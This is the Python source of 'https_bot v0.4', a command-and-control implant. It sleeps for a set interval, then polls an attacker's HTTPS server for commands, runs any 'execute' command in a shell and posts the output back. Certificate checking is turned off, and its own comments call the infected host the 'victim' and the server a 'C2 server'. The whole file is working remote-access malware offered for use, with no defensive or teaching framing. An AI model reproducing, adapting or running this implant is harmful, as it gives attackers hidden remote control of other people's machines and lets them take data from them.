#https_bot v0.4
import requests
import logging
import subprocess
import time
from optparse import OptionParser

def beacon(host, seconds):
  time.sleep(int(seconds))
  fetch, content = request(host)
  if str(fetch) == "<Response [200]>":
    output = parse(content)
    send(host, output)
  
def send(host, output):
  response = requests.post('https://'+host+'/out', data=output, verify=False)
  return response 

def request(host):
  response = requests.get('https://'+host+'/command', verify=False)
  return response, response.text

def request_certs(host, pcert, key):
  response = requests.get('https://'+host, verify=False, cert=(pcert, key))
  return response

def parse(response):
  commands = response.split()
  if commands[0] == "execute":
    ex = ' '.join(commands[1:])
    return execute(ex)
  else: return 0

def execute(command):
  proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
  stdoutput = proc.stdout.read() + proc.stderr.read()
  return stdoutput

def main():
  # Setup the command line arguments.
  optp = OptionParser()

  # Output verbosity options
  optp.add_option('-q', '--quiet', help='set logging to ERROR',
                  action='store_const', dest='loglevel',
                  const=logging.ERROR, default=logging.INFO)
  optp.add_option('-d', '--debug', help='set logging to DEBUG',
                  action='store_const', dest='loglevel',
                  const=logging.DEBUG, default=logging.INFO)
  optp.add_option('-v', '--verbose', help='set logging to COMM',
                  action='store_const', dest='loglevel',
                  const=5, default=logging.INFO)

  # Option to query a specific server
  optp.add_option("-s", "--server", dest="server",
                  help="HTTPS server to query")
  # Option to use client certificates
  optp.add_option("-p", "--cert", dest="cert",
                  help="public certificate")
  # Option to use client certificates
  optp.add_option("-k", "--key", dest="key",
                  help="certificate key")
  # How often should the victim beacon
  optp.add_option("-b", "--beacon", dest="beacon",
                  help="sleep between beacons in seconds")

  opts, args = optp.parse_args()

  # Setup logging.
  logging.basicConfig(level=opts.loglevel,
                      format='%(levelname)-8s %(message)s')

  if opts.server is None:
    opts.server = raw_input("C2 server: ")

  # Main Event Loop:
  try:
    while 1:
      beacon(opts.server, opts.beacon)

  except (KeyboardInterrupt, EOFError) as e:
    exit(0)


if __name__ == '__main__':
  main()
